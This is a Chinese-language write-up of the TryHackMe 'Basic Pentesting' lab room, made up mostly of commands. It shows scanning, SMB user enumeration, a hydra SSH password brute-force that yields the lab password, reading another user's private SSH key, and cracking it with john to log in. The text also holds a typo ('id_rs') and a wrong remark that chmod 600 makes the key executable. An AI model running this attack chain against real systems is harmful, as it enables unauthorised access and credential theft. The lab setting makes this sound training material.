---
title: TryHackMe-Basic Pentesting
description: 'Basic Computer Exploitation'
pubDate: 2024-04-06
image: /image/tryhackme.jpg
categories:
  - Documentation
tags:
  - Tryhackme
---

![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1712380869028-f1c696f1-145f-48a1-9b55-76d4952e3f45.png)

使用nmap进行端口扫描



nmap -sC -sV 10.10.98.83

![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1712380885797-b718a831-fc79-4011-bbb0-0b99e607ee81.png)



使用gobuster查找Web 服务器的隐藏目录：



gobuster dir -u 10.10.98.83 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1712380970398-d187662d-7b75-416d-835c-ed370083bdd5.png)



接下来我们获取目标机用户名：



Enum4Linux 的语法非常简单：enum4linux [options] ip



Enum4linux的常用参数选项：



TAG            FUNCTION



-U             get userlist  获取用户名单

-M             get machine list  获取机器名单

-N             get namelist dump (different from -U and-M)  获取名单转储信息

-S             get sharelist 获取共享列表

-P             get password policy information 获取密码策略信息

-G             get group and member list 获得组和成员名单

-a             all of the above (full basic enumeration) 以上所有(执行一个完整的基本SMB枚举)

enum4linux 10.10.98.83

 

![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1712380993319-46012f81-a800-44c1-b0ff-750557ebc578.png)

获取ssh连接的密码： 



hydra -l jan -P rockyou.txt 10.10.98.83 -t 4 ssh

![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1712380998128-657b2761-f71d-4fb2-b01d-1f7915a2418b.png)



 接下来就是连接ssh了



ssh jan@10.10.98.83

密码：armando



![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1712381003760-a4e1532e-ec45-40a8-aaeb-3ea02ae08a54.png)

查看敏感文件 



cd /home

 ![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1712381009463-6e36d529-c05f-42d4-a0fa-af98ade32e7c.png)



ls -la



![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1712381014295-8e61af89-4ce0-4a70-a225-7e43131cd66d.png)

ls -la /home/kay

![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1712381024312-8d118d1a-1028-4794-99d5-89a1d2941489.png)



ls -la /home/kay/.ssh

![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1712381028890-b2194feb-410e-4bef-8175-20b701306530.png)



cat /home/kay/.ssh/id_rsa

![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1712381039264-8e68ac6f-8e1c-4d8f-b1db-0edda3e099b5.png)



拿到密钥之后



我们在攻击机破解一下

![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1712381047503-8e167858-010a-4e1b-98b9-ef50a1a23e99.png)





python3 /opt/john/ssh2john.py id_rsa>hash.txt

john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1712381056874-cf41ee16-8531-438f-9d16-7a3047aaf9a7.png)



 我们先让id_rsa有可执行权限



chmod 600 id_rs

连接kay 



ssh -i id_rsa kay@10.10.98.83

 ![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1712381065036-085303f0-925d-4b76-885d-ac7f7f0d4fd2.png)

![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1712381070884-d70e08cb-dd17-430a-aeb3-cfae4732724c.png)



答题： 

![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1712381076884-bb0e9f63-8b90-4770-83b7-3dba62752cc7.png)

![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1712381083075-d1f331d7-de8e-4680-8d61-090454814844.png)





